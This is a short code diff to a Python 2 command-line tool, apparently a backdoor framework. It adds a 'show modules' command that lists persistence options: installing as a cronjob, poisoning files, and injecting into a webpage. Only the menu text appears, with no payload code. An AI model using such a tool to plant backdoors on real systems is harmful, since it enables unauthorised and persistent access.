@@ -44,7 +44,9 @@ class Backdoor(object, cmd.Cmd):
     def do_show(self, args):
         if args == "options":
             self.do_help(args)
-        else:
+        elif args == "modules":
+	    self.mods()
+	else:
             print BAD + "Unknown option %s", args
     
     def do_set(self, args):
@@ -65,6 +67,11 @@ class Backdoor(object, cmd.Cmd):
         else:
             return None
 
+    def mods(self):
+	print("Description                             Command")
+	print("Add as cronjob                          cron")
+	print("Poison files                            poison")
+	print("Add to a webpage                        web")
 
     def do_EOF(self, line):
         print ""
